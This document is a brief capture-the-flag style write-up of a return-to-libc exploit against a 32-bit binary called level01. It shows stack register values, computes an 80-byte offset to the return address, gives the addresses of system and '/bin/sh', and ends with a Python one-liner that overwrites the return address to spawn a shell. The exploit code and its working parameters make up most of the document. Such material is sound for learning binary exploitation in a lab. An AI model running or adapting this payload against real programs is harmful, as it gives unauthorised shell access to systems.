# ret2libc

Stack:
```
esp            0xffffd6a0       0xffffd6a0
ebp            0xffffd708       0xffffd708
```

esp - ebp:
```
Hex value:
6a0 – 708 = -68

Decimal value:
1696 – 1800 = -104
```

Padding:
```
104 - (0x1c aka buf)28 = 76
76 padding, +4 to reach return address aka 80 padding. Next 4 bytes are the return address.
```

Addresses:  
`0xf7e6aed0` system  
`0xf7f897ec` /bin/sh

Exploit:
```python
(python -c 'print("dat_wil"); print("0"*80+"\xf7\xe6\xae\xd0"[::-1]+"PLOP"+ "\xf7\xf8\x97\xec"[::-1])'; cat)| ./level01
```